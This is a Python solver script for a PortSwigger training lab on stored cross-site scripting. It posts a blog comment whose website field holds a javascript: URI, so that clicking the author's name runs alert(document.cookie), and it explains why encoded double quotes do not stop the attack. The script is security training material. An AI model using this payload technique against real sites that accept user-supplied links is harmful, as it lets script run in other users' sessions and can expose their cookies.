# Lab 08 — Stored XSS into anchor href attribute with double quotes HTML-encoded
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
#
# Vulnerability: Comment "website" field → written into href of author name link
# Aim:           Submit a comment so clicking the author name calls alert(document.cookie)
#
# Technique:
#   The website field value is placed into an anchor href:
#     <a href="WEBSITE_VALUE">Author</a>
#   Double quotes are encoded → can't break out of the attribute.
#   But we CONTROL THE ENTIRE VALUE → replace it with a javascript: URI:
#     <a href="javascript:alert(document.cookie)">Author</a>
#
#   Clicking the author name executes the JS.
#   No need to break out — we own the whole value.
#
# Usage: python xss_lab08.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, post_comment, verify_stored

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "javascript:alert(document.cookie)"
POST_ID = 1

if __name__ == "__main__":
    banner()
    section("LAB 08 — STORED XSS: href ATTRIBUTE, DOUBLE QUOTES ENCODED")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab08.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Posting comment with website = {PAYLOAD}\n")
    r = post_comment(
        session, url, POST_ID,
        comment="Click my name",
        name="XSS Author",
        email="a@b.com",
        website=PAYLOAD,
    )

    if r is None:
        print("  ✘  Comment submission failed")
        sys.exit(1)

    print(f"  ✔  Comment submitted (status {r.status_code})")
    print(f"  ➜  Verifying payload stored in href...\n")

    # The stored href will contain the raw javascript: URI
    verify_stored(session, url, POST_ID, PAYLOAD, "javascript: URI in href")

    print()
    print("  ➜  Open the post in a browser and click the author name:")
    print(f"     {url}/post?postId={POST_ID}")
    print("  ℹ  When href='javascript:...' and the user clicks, the JS runs.")
